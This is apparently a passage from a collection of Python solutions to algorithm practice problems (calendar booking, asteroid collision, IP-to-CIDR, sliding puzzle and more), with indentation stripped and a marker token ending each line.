if email in email_id:<\exit>
person = email_id[email]<\exit>
break<\exit>
for email in accounts[i][1:]:<\exit>
if person is None:<\exit>
person = i<\exit>
email_id[email] = person<\exit>
id_emails[person].append(email)<\exit>
elif email not in email_id:<\exit>
email_id[email] = person<\exit>
id_emails[person].append(email)<\exit>
ret = []<\exit>
for k, v in id_emails.items():<\exit>
ret.append([accounts[k][0]] + sorted(v))<\exit>
return ret<\exit>
class ListNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.next = None<\exit>
import math<\exit>
class Solution:<\exit>
def splitListToParts(self, root: ListNode, k: int) -> List[ListNode]:<\exit>
l = 0<\exit>
node = root<\exit>
while node:<\exit>
l += 1<\exit>
node = node.next<\exit>
ret = [[] for _ in range(k)]<\exit>
short_chunk_l = l // k<\exit>
long_chunk_l = short_chunk_l + 1<\exit>
n_long_chunk = l % k<\exit>
n_short_chunk = l - n_long_chunk<\exit>
chunk_counter = 0<\exit>
cur_l = 0<\exit>
node = root<\exit>
while node:<\exit>
ret[chunk_counter].append(node.val)<\exit>
cur_l += 1<\exit>
chunk_size = long_chunk_l if chunk_counter < n_long_chunk else short_chunk_l<\exit>
if cur_l == chunk_size:<\exit>
cur_l = 0<\exit>
chunk_counter += 1<\exit>
node = node.next<\exit>
return ret<\exit>
def splitListToParts_2(self, root: ListNode, k: int) -> List[ListNode]:<\exit>
l = 0<\exit>
node = root<\exit>
while node:<\exit>
l += 1<\exit>
node = node.next<\exit>
ret = [[] for _ in range(k)]<\exit>
node = root<\exit>
counter = 0<\exit>
cur_l = 0<\exit>
i = 0<\exit>
part_l = math.ceil((l - counter) / k)<\exit>
while node:<\exit>
cur_l += 1<\exit>
counter += 1<\exit>
ret[i].append(node.val)<\exit>
if cur_l == part_l:<\exit>
k -= 1<\exit>
cur_l = 0<\exit>
i += 1<\exit>
if k != 0:<\exit>
part_l = math.ceil((l - counter) / k)<\exit>
node = node.next<\exit>
return ret<\exit>
def splitListToParts_error(self, root: ListNode, k: int) -> List[ListNode]:<\exit>
l = 0<\exit>
node = root<\exit>
while node:<\exit>
l += 1<\exit>
node = node.next<\exit>
part_l = math.ceil(l / k)<\exit>
ret = [[] for _ in range(k)]<\exit>
node = root<\exit>
cur_l = 0<\exit>
i = 0<\exit>
while node:<\exit>
cur_l += 1<\exit>
ret[i].append(node.val)<\exit>
if cur_l == part_l:<\exit>
cur_l = 0<\exit>
i += 1<\exit>
node = node.next<\exit>
return ret<\exit>
class Node:<\exit>
def __init__(self, s, e):<\exit>
self.s = s<\exit>
self.e = e<\exit>
self.left = None<\exit>
self.right = None<\exit>
class MyCalendar:<\exit>
def __init__(self):<\exit>
self.root = None<\exit>
def insert(self, node: Node, s: int, e: int) -> Node:<\exit>
if not node:<\exit>
return Node(s, e)<\exit>
if e <= node.s:<\exit>
left = self.insert(node.left, s, e)<\exit>
if left is None:<\exit>
return None<\exit>
node.left = left<\exit>
return node<\exit>
elif s >= node.e:<\exit>
right = self.insert(node.right, s, e)<\exit>
if right is None:<\exit>
return None<\exit>
node.right = right<\exit>
return node<\exit>
else:<\exit>
return None<\exit>
def book(self, start: int, end: int) -> bool:<\exit>
ret = self.insert(self.root, start, end)<\exit>
if ret is None:<\exit>
return False<\exit>
self.root = ret<\exit>
return True<\exit>
import bisect<\exit>
class MyCalendarTwo:<\exit>
def __init__(self):<\exit>
self.lst = []<\exit>
def book(self, start: int, end: int) -> bool:<\exit>
bisect.insort(self.lst, (start, "start"))<\exit>
bisect.insort(self.lst, (end, "end"))<\exit>
count = 0<\exit>
for _, flag in self.lst:<\exit>
count += 1 if flag == "start" else -1<\exit>
if count > 2:<\exit>
self.lst.remove((start, "start"))<\exit>
self.lst.remove((end, "end"))<\exit>
return False<\exit>
return True<\exit>
import bisect<\exit>
class MyCalendarThree:<\exit>
def __init__(self):<\exit>
self.lst = []<\exit>
def book(self, start: int, end: int) -> int:<\exit>
bisect.insort(self.lst, (start, "start"))<\exit>
bisect.insort(self.lst, (end, "end"))<\exit>
ret = 0<\exit>
count = 0<\exit>
for _, flag in self.lst:<\exit>
count += 1 if flag == "start" else -1<\exit>
ret = max(ret, count)<\exit>
return ret<\exit>
from typing import List<\exit>
dirs = ((-1, 0), (1, 0), (0, -1), (0, 1))<\exit>
class Solution:<\exit>
def floodFill(self, image: List[List[int]], sr: int, sc: int, newColor: int) -> List[List[int]]:<\exit>
cur_color = image[sr][sc]<\exit>
if cur_color == newColor:<\exit>
return image<\exit>
self.dfs(image, sr, sc, cur_color, newColor)<\exit>
return image<\exit>
def dfs(self, image, i, j, cur_color, new_color):<\exit>
image[i][j] = new_color<\exit>
m, n = len(image), len(image[0])<\exit>
for di, dj in dirs:<\exit>
I = i + di<\exit>
J = j + dj<\exit>
if 0 <= I < m and 0 <= J < n and image[I][J] == cur_color:<\exit>
self.dfs(image, I, J, cur_color, new_color)<\exit>
from typing import List<\exit>
class Solution:<\exit>
def asteroidCollision(self, asteroids: List[int]) -> List[int]:<\exit>
stk = []<\exit>
for e in asteroids:<\exit>
while stk and e < 0 < stk[-1]:<\exit>
if abs(e) > abs(stk[-1]):<\exit>
stk.pop()<\exit>
elif abs(e) == abs(stk[-1]):<\exit>
stk.pop()<\exit>
break<\exit>
else:<\exit>
break<\exit>
else:<\exit>
stk.append(e)<\exit>
return stk<\exit>
def asteroidCollision_complex(self, asteroids: List[int]) -> List[int]:<\exit>
stk = []<\exit>
n = len(asteroids)<\exit>
for i in range(n-1, -1, -1):<\exit>
cur = asteroids[i]<\exit>
while stk and asteroids[stk[-1]] < 0 and cur > 0 and abs(asteroids[stk[-1]]) < abs(cur):<\exit>
stk.pop()<\exit>
if stk and cur > 0 and asteroids[stk[-1]] == -cur:<\exit>
stk.pop()<\exit>
continue<\exit>
if not stk:<\exit>
stk.append(i)<\exit>
continue<\exit>
if not (asteroids[stk[-1]] < 0 and cur > 0) or abs(cur) > abs(asteroids[stk[-1]]):<\exit>
stk.append(i)<\exit>
return [<\exit>
asteroids[i]<\exit>
for i in stk[::-1]<\exit>
]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().asteroidCollision([10, 2, -5]) == [10]<\exit>
assert Solution().asteroidCollision([5, 10, -5]) == [5, 10]<\exit>
assert Solution().asteroidCollision([8, -8]) == []<\exit>
class Solution:<\exit>
def monotoneIncreasingDigits(self, N: int) -> int:<\exit>
digits = [int(e) for e in str(N)]<\exit>
pointer = len(digits)<\exit>
for i in range(len(digits) - 1, 0, -1):<\exit>
if digits[i - 1] > digits[i]:<\exit>
pointer = i<\exit>
digits[i - 1] -= 1<\exit>
for i in range(pointer, len(digits)):<\exit>
digits[i] = 9<\exit>
return int("".join(map(str, digits)))<\exit>
if __name__ == "__main__":<\exit>
assert Solution().monotoneIncreasingDigits(10) == 9<\exit>
assert Solution().monotoneIncreasingDigits(332) == 299<\exit>
from typing import List<\exit>
from collections import deque<\exit>
class Solution:<\exit>
def dailyTemperatures(self, T: List[int]) -> List[int]:<\exit>
ret = deque()<\exit>
stk = []<\exit>
for i in range(len(T) - 1, -1 , -1):<\exit>
while stk and T[stk[-1]] <= T[i]:<\exit>
stk.pop()<\exit>
if stk:<\exit>
ret.appendleft(stk[-1] - i)<\exit>
else:<\exit>
ret.appendleft(0)<\exit>
stk.append(i)<\exit>
return list(ret)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().dailyTemperatures([73, 74, 75, 71, 69, 72, 76, 73]) == [1, 1, 4, 2, 1, 1, 0, 0]<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def deleteAndEarn(self, nums: List[int]) -> int:<\exit>
rewards = [0 for _ in range(10001)]<\exit>
for num in nums:<\exit>
rewards[num] += num<\exit>
cur, prev = 0, 0<\exit>
for reward in rewards:<\exit>
nxt = max(cur, prev + reward)<\exit>
prev = cur<\exit>
cur = nxt<\exit>
return cur<\exit>
def deleteAndEarn_dp(self, nums: List[int]) -> int:<\exit>
counter = defaultdict(int)<\exit>
for n in nums:<\exit>
counter[n] += 1<\exit>
F = [0 for _ in range(10000 + 3)]<\exit>
for i in range(3, 10000 + 3):<\exit>
cur = i - 2<\exit>
F[i] = max(<\exit>
F[i-1],<\exit>
F[i-2] + counter[cur] * cur<\exit>
)<\exit>
return F[-1]<\exit>
def deleteAndEarn_slow(self, nums: List[int]) -> int:<\exit>
nums.sort()<\exit>
counter = []<\exit>
i = 0<\exit>
j = 0<\exit>
while i < len(nums):<\exit>
while j < len(nums) and nums[i] == nums[j]:<\exit>
j += 1<\exit>
counter.append((nums[i], j - i))<\exit>
i = j<\exit>
F = [0 for _ in counter]<\exit>
for i in range(len(counter)):<\exit>
F[i] = counter[i][0] * counter[i][1]<\exit>
F[i] += max(<\exit>
[<\exit>
F[j]<\exit>
for j in range(i)<\exit>
if counter[j][0] != counter[i][0] - 1<\exit>
]<\exit>
or [0]<\exit>
)<\exit>
return max(F or [0])<\exit>
if __name__ == "__main__":<\exit>
assert Solution().deleteAndEarn([1,1,1,2,4,5,5,5,6]) == 18<\exit>
assert Solution().deleteAndEarn([3, 4, 2]) == 6<\exit>
assert Solution().deleteAndEarn([2, 2, 3, 3, 3, 4]) == 9<\exit>
from typing import List<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.cache = {}<\exit>
def cherryPickup(self, grid: List[List[int]]) -> int:<\exit>
return max(0, self.F(grid, 0, 0, 0))<\exit>
def F(self, grid, r1, c1, r2):<\exit>
n = len(grid)<\exit>
if (r1, c1, r2) not in self.cache:<\exit>
ret = float("-inf")<\exit>
c2 = r1 + c1 - r2<\exit>
if 0 <= r1 < n and 0 <= c1 < n and 0 <= r2 < n and 0 <= c2 < n:<\exit>
if grid[r1][c1] != -1 and grid[r2][c2] != -1:<\exit>
ret = 0<\exit>
ret += grid[r1][c1]<\exit>
if r1 != r2:<\exit>
ret += grid[r2][c2]<\exit>
if r1 == n - 1 and c1 == n - 1:<\exit>
pass<\exit>
else:<\exit>
ret += max(<\exit>
self.F(grid, r1+1, c1, r2+1),<\exit>
self.F(grid, r1+1, c1, r2),<\exit>
self.F(grid, r1, c1+1, r2+1),<\exit>
self.F(grid, r1, c1+1, r2),<\exit>
)<\exit>
self.cache[r1, c1, r2] = ret<\exit>
return self.cache[r1, c1, r2]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().cherryPickup(<\exit>
[[0, 1, -1],<\exit>
[1, 0, -1],<\exit>
[1, 1,  1]]<\exit>
) == 5<\exit>
assert Solution().cherryPickup(<\exit>
[[1, 1, -1],<\exit>
[1, -1, 1],<\exit>
[-1, 1, 1]]<\exit>
) == 0<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
import heapq<\exit>
class Solution:<\exit>
def networkDelayTime(self, times: List[List[int]], N: int, K: int) -> int:<\exit>
G = defaultdict(dict)<\exit>
reach_time = [float('inf') for _ in range(N + 1)]<\exit>
for u, v, w in times:<\exit>
G[u][v] = w<\exit>
h = [(0, K)]<\exit>
reach_time[K] = 0<\exit>
while h:<\exit>
t, s = heapq.heappop(h)<\exit>
if s in G:<\exit>
for d, w in G[s].items():<\exit>
if t + w < reach_time[d]:<\exit>
reach_time[d] = t + w<\exit>
heapq.heappush(h, (t + w, d))<\exit>
ret = max(reach_time[1:])<\exit>
if ret == float('inf'):<\exit>
return -1<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().networkDelayTime([[2,1,1],[2,3,1],[3,4,1]], 4, 2) == 2<\exit>
from typing import List<\exit>
class Solution:<\exit>
def minCostClimbingStairs(self, cost: List[int]) -> int:<\exit>
n = len(cost)<\exit>
F = [float('inf') for _ in range(n+1)]<\exit>
F[0] = 0<\exit>
F[1] = 0<\exit>
for i in range(2, n+1):<\exit>
F[i] = min(<\exit>
F[i-2] + cost[i-2],<\exit>
F[i-1] + cost[i-1]<\exit>
)<\exit>
return F[-1]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minCostClimbingStairs([10, 15, 20]) == 15<\exit>
from typing import List<\exit>
weights = [<\exit>
24,<\exit>
16,<\exit>
8,<\exit>
0,<\exit>
]<\exit>
class Solution:<\exit>
def ipToCIDR(self, ip: str, n: int) -> List[str]:<\exit>
num_ip = self.to_bin(ip)<\exit>
ret = []<\exit>
while n > 0:<\exit>
lsb = self.get_lsb(num_ip)<\exit>
while (1 << lsb) > n:<\exit>
lsb -= 1<\exit>
cur_cover = 1 << lsb<\exit>
n -= cur_cover<\exit>
ret.append(<\exit>
self.to_ip(num_ip) + f"/{32-lsb}"<\exit>
)<\exit>
num_ip += cur_cover<\exit>
return ret<\exit>
def to_bin(self, ip):<\exit>
ret = 0<\exit>
for n, w in zip(map(int, ip.split(".")), weights):<\exit>
ret += n << w<\exit>
return ret<\exit>
def to_ip(self, bin):<\exit>
ret = []<\exit>
for w in weights:<\exit>
ret.append(<\exit>
(bin >> w) & 255<\exit>
)<\exit>
return ".".join(map(str, ret))<\exit>
def get_lsb(self, n):<\exit>
lsb = 0<\exit>
while (n >> lsb) & 1 == 0:<\exit>
lsb += 1<\exit>
return lsb<\exit>
if __name__ == "__main__":<\exit>
assert Solution().ipToCIDR("60.166.253.147", 12) == ["60.166.253.147/32","60.166.253.148/30","60.166.253.152/30","60.166.253.156/31","60.166.253.158/32"]<\exit>
assert Solution().ipToCIDR("255.0.0.7", 10) == ["255.0.0.7/32","255.0.0.8/29","255.0.0.16/32"]<\exit>
from typing import List<\exit>
class Solution:<\exit>
def openLock(self, deadends: List[str], target: str) -> int:<\exit>
destination = tuple(int(c) for c in target)<\exit>
deadends_set = set(<\exit>
tuple(int(c) for c in s)<\exit>
for s in deadends<\exit>
)<\exit>
q = [(0, 0, 0, 0)]<\exit>
if q[0] in deadends_set:<\exit>
return -1<\exit>
step = 0<\exit>
visited = set(q)<\exit>
while q:<\exit>
cur_q = []<\exit>
for e in q:<\exit>
if e == destination:<\exit>
return step<\exit>
for i in range(4):<\exit>
for delta in (-1, 1):<\exit>
nxt_lst = list(e)<\exit>
nxt_lst[i] = (nxt_lst[i] + delta) % 10<\exit>
nxt = tuple(nxt_lst)<\exit>
if nxt not in visited and nxt not in deadends_set:<\exit>
visited.add(nxt)<\exit>
cur_q.append(nxt)<\exit>
step += 1<\exit>
q = cur_q<\exit>
return -1<\exit>
if __name__ == "__main__":<\exit>
assert Solution().openLock(["8888"], "0009") == 1<\exit>
assert Solution().openLock(["8887","8889","8878","8898","8788","8988","7888","9888"], "8888") == -1<\exit>
class Solution:<\exit>
def reachNumber(self, target: int) -> int:<\exit>
target = abs(target)<\exit>
s = 0<\exit>
k = 0<\exit>
while s < target:<\exit>
k += 1<\exit>
s += k<\exit>
delta = s - target<\exit>
if delta % 2 == 0:<\exit>
return k<\exit>
else:<\exit>
if (k + 1) % 2 == 1:<\exit>
return k + 1<\exit>
else:<\exit>
return k + 2<\exit>
from typing import List<\exit>
class Solution:<\exit>
def pourWater(self, heights: List[int], V: int, K: int) -> List[int]:<\exit>
for _ in range(V):<\exit>
s = K<\exit>
optimal = s<\exit>
for i in range(s-1, -1, -1):<\exit>
if heights[i] <= heights[i+1]:<\exit>
if heights[i] < heights[optimal]:<\exit>
optimal = i<\exit>
else:<\exit>
break<\exit>
if optimal == s:<\exit>
for i in range(s+1, len(heights)):<\exit>
if heights[i] <= heights[i-1]:<\exit>
if heights[i] < heights[optimal]:<\exit>
optimal = i<\exit>
else:<\exit>
break<\exit>
heights[optimal] += 1<\exit>
return heights<\exit>
if __name__ == "__main__":<\exit>
assert Solution().pourWater([2,1,1,2,1,2,2], 4, 3) == [2,2,2,3,2,2,2]<\exit>
import itertools<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def pyramidTransition(self, bottom: str, allowed: List[str]) -> bool:<\exit>
T = defaultdict(set)<\exit>
for a, b, c in allowed:<\exit>
T[a, b].add(c)<\exit>
return self.dfs(T, bottom)<\exit>
def dfs(self, T, level) -> bool:<\exit>
if len(level) == 1:<\exit>
return True<\exit>
for nxt_level in itertools.product(<\exit>
*[T[a, b] for a, b in zip(level, level[1:])]<\exit>
):<\exit>
if self.dfs(T, nxt_level):<\exit>
return True<\exit>
return False<\exit>
def gen_nxt_level(self, T, level, lo):<\exit>
if lo + 1 >= len(level):<\exit>
yield ""<\exit>
return<\exit>
for head in T[level[lo], level[lo + 1]]:<\exit>
for tail in self.gen_nxt_level(T, level, lo + 1):<\exit>
yield head + tail<\exit>
def dfs_deep(self, T, level, lo, nxt_level) -> bool:<\exit>
if lo + 1 == len(level):<\exit>
return True<\exit>
for nxt in T[level[lo], level[lo + 1]]:<\exit>
nxt_level.append(nxt)<\exit>
if self.dfs(T, level, lo + 1, nxt_level):<\exit>
if self.dfs(T, nxt_level, 0, []):<\exit>
return True<\exit>
nxt_level.pop()<\exit>
return False<\exit>
if __name__ == "__main__":<\exit>
assert Solution().pyramidTransition("BCD", ["BCG", "CDE", "GEA", "FFF"]) == True<\exit>
assert Solution().pyramidTransition("AABA", ["AAA", "AAB", "ABA", "ABB", "BAC"]) == False<\exit>
from typing import List<\exit>
import heapq<\exit>
S = 0<\exit>
E = 1<\exit>
class Solution:<\exit>
def employeeFreeTime(self, schedule: List[List[List[int]]]) -> List[List[int]]:<\exit>
cur_max_end = min(<\exit>
itv[E]<\exit>
for itvs in schedule<\exit>
for itv in itvs<\exit>
)<\exit>
q = []<\exit>
for i, itvs in enumerate(schedule):<\exit>
j = 0<\exit>
itv = itvs[j]<\exit>
heapq.heappush(q, (itv[S], i, j))<\exit>
ret = []<\exit>
while q:<\exit>
_, i, j = heapq.heappop(q)<\exit>
itv = schedule[i][j]<\exit>
if cur_max_end < itv[S]:<\exit>
ret.append([cur_max_end, itv[S]])<\exit>
cur_max_end = max(cur_max_end, itv[E])<\exit>
j += 1<\exit>
if j < len(schedule[i]):<\exit>
itv = schedule[i][j]<\exit>
heapq.heappush(q, (itv[S], i, j))<\exit>
return ret<\exit>
def employeeFreeTime(self, schedule: List[List[List[int]]]) -> List[List[int]]:<\exit>
lst = []<\exit>
for itvs in schedule:<\exit>
for itv in itvs:<\exit>
lst.append([itv[S], S])<\exit>
lst.append([itv[E], E])<\exit>
lst.sort()<\exit>
count = 0<\exit>
prev = None<\exit>
ret = []<\exit>
for t, flag in lst:<\exit>
if count == 0 and prev:<\exit>
ret.append([prev, t])<\exit>
if flag == S:<\exit>
count += 1<\exit>
else:<\exit>
prev = t<\exit>
count -= 1<\exit>
return ret<\exit>
def employeeFreeTime_error(self, schedule: List[List[List[int]]]) -> List[List[int]]:<\exit>
schedules = list(map(iter, schedule))<\exit>
cur_max_end = min(<\exit>
itv[E]<\exit>
for emp in schedule<\exit>
for itv in emp<\exit>
)<\exit>
q = []<\exit>
for emp_iter in schedules:<\exit>
itv = next(emp_iter, None)<\exit>
if itv:<\exit>
heapq.heappush(q, (itv[S], itv, emp_iter))<\exit>
ret = []<\exit>
while q:<\exit>
_, itv, emp_iter = heapq.heappop(q)<\exit>
if cur_max_end < itv[S]:<\exit>
ret.append([cur_max_end, itv[S]])<\exit>
cur_max_end = max(cur_max_end, itv[E])<\exit>
itv = next(emp_iter, None)<\exit>
if itv:<\exit>
heapq.heappush(q, (itv[S], itv, emp_iter))<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().employeeFreeTime([[[1,2],[5,6]],[[1,3]],[[4,10]]]) == [[3,4]]<\exit>
assert Solution().employeeFreeTime([[[4,16],[31,36],[42,50],[80,83],[95,96]],[[4,13],[14,19],[37,53],[64,66],[85,89]],[[17,24],[38,39],[49,51],[62,67],[79,81]],[[9,15],[17,24],[45,63],[65,68],[87,88]],[[17,33],[39,41],[43,57],[58,63],[70,84]]]) == [[36, 37], [68, 70], [84, 85], [89, 95]]<\exit>
from typing import List<\exit>
class Solution:<\exit>
def partitionLabels(self, S: str) -> List[int]:<\exit>
lasts = {}<\exit>
n = len(S)<\exit>
for i in range(n-1, -1, -1):<\exit>
if S[i] not in lasts:<\exit>
lasts[S[i]] = i<\exit>
indexes = [-1]<\exit>
cur_last = 0<\exit>
for i in range(n):<\exit>
cur_last = max(cur_last, lasts[S[i]])<\exit>
if cur_last == i:<\exit>
indexes.append(cur_last)<\exit>
ret = []<\exit>
for i in range(len(indexes) - 1):<\exit>
ret.append(indexes[i+1] - indexes[i])<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().partitionLabels("ababcbacadefegdehijhklij") == [9, 7, 8]<\exit>
from typing import List<\exit>
class Solution:<\exit>
def orderOfLargestPlusSign(self, N: int, mines: List[List[int]]) -> int:<\exit>
G = [[1 for _ in range(N)] for _ in range(N)]<\exit>
for i, j in mines:<\exit>
G[i][j] = 0<\exit>
F = [[[G[i][j] for _ in range(4)] for j in range(N)] for i in range(N)]<\exit>
for i in range(N):<\exit>
for j in range(N):<\exit>
if j - 1 >= 0 and G[i][j] == 1:<\exit>
F[i][j][0] = F[i][j-1][0] + 1<\exit>
if i - 1 >= 0 and G[i][j] == 1:<\exit>
F[i][j][1] = F[i-1][j][1] + 1<\exit>
for i in range(N-1, -1, -1):<\exit>
for j in range(N-1, -1, -1):<\exit>
if j + 1 < N and G[i][j] == 1:<\exit>
F[i][j][2] = F[i][j+1][2] + 1<\exit>
if i + 1 < N and G[i][j] == 1:<\exit>
F[i][j][3] = F[i+1][j][3] + 1<\exit>
ret = 0<\exit>
for i in range(N):<\exit>
for j in range(N):<\exit>
ret = max(ret, min(F[i][j]))<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().orderOfLargestPlusSign(5, [[4, 2]]) == 2<\exit>
from typing import List<\exit>
class Solution:<\exit>
def isToeplitzMatrix(self, matrix: List[List[int]]) -> bool:<\exit>
m, n = len(matrix), len(matrix[0])<\exit>
for i in range(1, m):<\exit>
for j in range(1, n):<\exit>
if matrix[i][j] != matrix[i-1][j-1]:<\exit>
return False<\exit>
return True<\exit>
def isToeplitzMatrix_complex(self, matrix: List[List[int]]) -> bool:<\exit>
m, n = len(matrix), len(matrix[0])<\exit>
for j in range(n):<\exit>
r = 0<\exit>
c = j<\exit>
cur = matrix[r][c]<\exit>
while r < m and c < n:<\exit>
if cur != matrix[r][c]:<\exit>
return False<\exit>
r += 1<\exit>
c += 1<\exit>
for i in range(1, m):<\exit>
r = i<\exit>
c = 0<\exit>
cur = matrix[r][c]<\exit>
while r < m and c < n:<\exit>
if cur != matrix[r][c]:<\exit>
return False<\exit>
r += 1<\exit>
c += 1<\exit>
return True<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def reorganizeString(self, S: str) -> str:<\exit>
counter = defaultdict(int)<\exit>
for c in S:<\exit>
counter[c] += 1<\exit>
lst = [<\exit>
(-n, n, c)<\exit>
for c, n in counter.items()<\exit>
]<\exit>
lst.sort()<\exit>
piles = []<\exit>
_, n, c = lst[0]<\exit>
for i in range(n):<\exit>
piles.append([c])<\exit>
cnt = 0<\exit>
for _, n, c in lst[1:]:<\exit>
for _ in range(n):<\exit>
piles[cnt].append(c)<\exit>
cnt = (cnt + 1) % len(piles)<\exit>
if len(piles) > 1 and len(piles[-2]) == 1:<\exit>
return ""<\exit>
return "".join(<\exit>
map(lambda x: "".join(x), piles)<\exit>
)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().reorganizeString("vvvlo") == "vlvov"<\exit>
assert Solution().reorganizeString("aab") == "aba"<\exit>
assert Solution().reorganizeString("aaab") == ""<\exit>
from typing import List<\exit>
from collections import defaultdict, deque<\exit>
class Solution:<\exit>
def maxChunksToSorted(self, arr: List[int]) -> int:<\exit>
A = sorted(arr)<\exit>
hm = defaultdict(deque)<\exit>
for i, e in enumerate(A):<\exit>
hm[e].append(i)<\exit>
proxy = []<\exit>
for e in arr:<\exit>
proxy.append(hm[e].popleft())<\exit>
ret = 0<\exit>
cur_max_idx = 0<\exit>
for i, e in enumerate(proxy):<\exit>
cur_max_idx = max(cur_max_idx, e)<\exit>
if cur_max_idx == i:<\exit>
ret += 1<\exit>
return ret<\exit>
from typing import List<\exit>
class Solution:<\exit>
def maxChunksToSorted(self, arr: List[int]) -> int:<\exit>
ret = 0<\exit>
cur_max_idx = 0<\exit>
for i in range(len(arr)):<\exit>
cur_max_idx = max(cur_max_idx, arr[i])<\exit>
if i == cur_max_idx:<\exit>
ret += 1<\exit>
return ret<\exit>
class Solution:<\exit>
def numJewelsInStones(self, J: str, S: str) -> int:<\exit>
targets = set(J)<\exit>
ret = 0<\exit>
for c in S:<\exit>
if c in targets:<\exit>
ret += 1<\exit>
return ret<\exit>
class Solution:<\exit>
def calculate(self, s: str) -> int:<\exit>
s = s + "\0"<\exit>
ret, _ = self.eval(s, 0, [])<\exit>
return ret<\exit>
def eval(self, s, i, stk):<\exit>
operand = 0<\exit>
prev_op = "+"<\exit>
while i < len(s):<\exit>
c = s[i]<\exit>
if c == " ":<\exit>
pass<\exit>
elif c.isdigit():<\exit>
operand = operand * 10 + int(c)<\exit>
elif c in ("+", "-", "*", "/", ")", "\0"):<\exit>
if prev_op == "+":<\exit>
stk.append(operand)<\exit>
elif prev_op == "-":<\exit>
stk.append(-operand)<\exit>
elif prev_op == "*":<\exit>
prev_operand = stk.pop()<\exit>
stk.append(prev_operand * operand)<\exit>
elif prev_op == "/":<\exit>
prev_operand = stk.pop()<\exit>
stk.append(int(prev_operand / operand))<\exit>
if c in ("+", "-", "*", "/"):<\exit>
operand = 0<\exit>
prev_op = c<\exit>
elif c in (")", "\0"):<\exit>
return sum(stk), i<\exit>
elif c == "(":<\exit>
operand, i = self.eval(s, i + 1, [])<\exit>
else:<\exit>
raise<\exit>
i += 1<\exit>
if __name__ == "__main__":<\exit>
assert Solution().calculate("(( ( ( 4- 2)+ ( 6+ 10 ) )+ 1) /( ( ( 7 + 9 )* ( 5*8) )- ( 5 + ( 2 * 10 ) ) ) )") == 0<\exit>
assert Solution().calculate("(2+6* 3+5- (3*14/7+2)*5)+3") == -12<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
from copy import deepcopy<\exit>
import heapq<\exit>
final_pos = {<\exit>
1: (0, 0),<\exit>
2: (0, 1),<\exit>
3: (0, 2),<\exit>
4: (1, 0),<\exit>
5: (1, 1),<\exit>
0: (1, 2),<\exit>
}<\exit>
dirs = (<\exit>
(0, -1),<\exit>
(0, 1),<\exit>
(-1, 0),<\exit>
(1, 0),<\exit>
)<\exit>
class Solution:<\exit>
def slidingPuzzle(self, board: List[List[int]]) -> int:<\exit>
visited = defaultdict(bool)<\exit>
m, n = len(board), len(board[0])<\exit>
q = [(self.heuristic_dist(board) + 0, 0, board)]<\exit>
target = [<\exit>
[1, 2, 3],<\exit>
[4, 5, 0],<\exit>
]<\exit>
while q:<\exit>
heu, cur_dist, board = heapq.heappop(q)<\exit>
visited[self.ser(board)] = True<\exit>
if board == target:<\exit>
return cur_dist<\exit>
cur_dist += 1<\exit>
i, j = self.zero_pos(board)<\exit>
for di, dj in dirs:<\exit>
I = i + di<\exit>
J = j + dj<\exit>
if 0 <= I < m and 0 <= J < n:<\exit>
B = deepcopy(board)<\exit>
B[I][J], B[i][j] = B[i][j], B[I][J]<\exit>
if not visited[self.ser(B)]:<\exit>
heapq.heappush(q, (self.heuristic_dist(B) + cur_dist, cur_dist, B))<\exit>
return -1<\exit>
def zero_pos(self, board):<\exit>
for i, row in enumerate(board):<\exit>
for j, v in enumerate(row):<\exit>
if v == 0:<\exit>
return i, j<\exit>
raise<\exit>
def heuristic_dist(self, board):<\exit>
ret = 0<\exit>
for i, row in enumerate(board):<\exit>
for j, v in enumerate(row):<\exit>
if v != 0:<\exit>
I, J = final_pos[v]<\exit>
ret += abs(i - I) + abs(j - J)<\exit>
return ret<\exit>
def ser(self, board):<\exit>
return tuple(<\exit>
tuple(row)<\exit>
for row in board<\exit>
)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().slidingPuzzle([[1,2,3],[4,0,5]]) == 1<\exit>
assert Solution().slidingPuzzle([[1,2,3],[5,4,0]]) == -1<\exit>
class Solution:<\exit>
def kthGrammar(self, N: int, K: int) -> int:<\exit>
return self.dfs(N, K, True)<\exit>
def dfs(self, N, K, not_flip):<\exit>
if N == 1:<\exit>
return 0 if not_flip else 1<\exit>
half_l = 2 ** (N - 1) // 2<\exit>
if K <= half_l:<\exit>
return self.dfs(N - 1, K, not_flip)<\exit>
else:<\exit>
return self.dfs(N - 1, K - half_l, not not_flip)<\exit>
def kthGrammar_TLE(self, N: int, K: int) -> int:<\exit>
row = 0<\exit>
pos = 1<\exit>
for n in range(1, N):<\exit>
row = (row << pos) + (~row & 2 ** pos - 1)<\exit>
pos *= 2<\exit>
ret = row >> pos - K & 1<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().kthGrammar(1, 1) == 0<\exit>
assert Solution().kthGrammar(2, 1) == 0<\exit>
assert Solution().kthGrammar(2, 2) == 1<\exit>
assert Solution().kthGrammar(4, 5) == 1<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.prev = None<\exit>
self.ret = float('inf')<\exit>
def minDiffInBST(self, root: TreeNode) -> int:<\exit>
if not root:<\exit>
return<\exit>
self.minDiffInBST(root.left)<\exit>
if self.prev:<\exit>
self.ret = min(self.ret, root.val - self.prev)<\exit>
self.prev = root.val<\exit>
self.minDiffInBST(root.right)<\exit>
return self.ret<\exit>
from typing import List<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.ret = []<\exit>
def letterCasePermutation(self, S: str) -> List[str]:<\exit>
S_lst = list(S)<\exit>
self.dfs([], S_lst, 0)<\exit>
return [<\exit>
"".join(e)<\exit>
